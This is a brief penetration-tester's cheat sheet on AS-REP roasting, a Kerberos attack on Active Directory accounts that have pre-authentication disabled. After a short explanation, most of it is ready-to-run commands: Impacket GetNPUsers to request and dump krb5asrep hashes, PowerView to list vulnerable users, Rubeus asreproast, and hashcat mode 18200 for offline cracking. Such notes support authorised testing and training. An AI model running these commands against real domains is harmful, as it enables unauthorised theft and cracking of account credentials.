# asrep roasting

AS-REP Roasting works only for users with Kerberos pre-authentication disabled

* Dumps the **krbasrep5 hashes** of user accounts
* If pre-authentication is disabled, you can request any authentication data for any user and the KDC will return an
  encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who
  they say that they are.
* This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the
  specified user account.

## Usage

### using impacket

```bash
# Enumerate the users > user.txt
impacket-GetNPUsers DOMAIN/ -usersfile user.txt -format hashcat [-outputfile hash]
impacket-GetNPUsers DOMAIN/USER -no-pass -dc-ip IP -format hashcat
impacket-GetNPUsers -dc-ip IP -request DOMAIN/
# hashcat -m 18200
```

### using powerview

```bash
Get-DomainUser -PreauthNotRequired -Verbose
```

### using rubeus

```bash
Rubeus.exe asreproast /format:hashcat /domain:DOMAIN [/outfile:FILE]
# add $23 after $krb5asrep$
# hashcat -m 18200
```